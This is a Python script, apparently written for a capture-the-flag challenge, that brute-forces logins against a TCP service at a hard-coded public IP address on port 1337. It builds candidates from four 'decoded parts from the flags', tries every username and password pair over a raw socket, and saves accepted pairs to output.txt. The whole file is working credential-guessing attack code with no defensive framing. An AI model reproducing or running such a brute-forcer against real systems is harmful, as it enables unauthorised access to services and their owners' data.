import socket
from itertools import permutations

# Target server
IP = "82.25.105.26"
PORT = 1337

# Decoded parts from the flags
PARTS = ["16", "Apr", "Jammu", "GandhiNagar"]

# Generate permutations for username/password (1-2 parts combined)
def generate_combinations():
    combinations = []
    # Single parts
    combinations.extend(PARTS)
    # Two-part concatenations (e.g., "16Apr")
    for r in permutations(PARTS, 2):
        combinations.append("".join(r))
    return list(set(combinations))  # Remove duplicates

# Test credentials against the server
def try_login(username, password):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((IP, PORT))
            # Check if server asks for username/password
            banner = s.recv(1024).decode().strip()
            if "username" in banner.lower():
                s.send(f"{username}\n".encode())
                pass_prompt = s.recv(1024).decode()
                if "password" in pass_prompt.lower():
                    s.send(f"{password}\n".encode())
                    response = s.recv(1024).decode()
                    if "granted" in response.lower() or "success" in response.lower():
                        return True
            else:
                # Fallback: Send as single activation code
                s.send(f"{username}\n".encode())
                response = s.recv(1024).decode()
                if "granted" in response.lower():
                    return True
    except Exception as e:
        pass
    return False

# Main brute-force logic
def main():
    candidates = generate_combinations()
    successful = []
    
    # Try all username/password permutations
    for username in candidates:
        for password in candidates:
            print(f"Trying: {username} / {password}")
            if try_login(username, password):
                successful.append((username, password))
                with open("output.txt", "a") as f:
                    f.write(f"VALID: {username} / {password}\n")
    
    print(f"Done. Valid credentials saved to output.txt")

if __name__ == "__main__":
    main()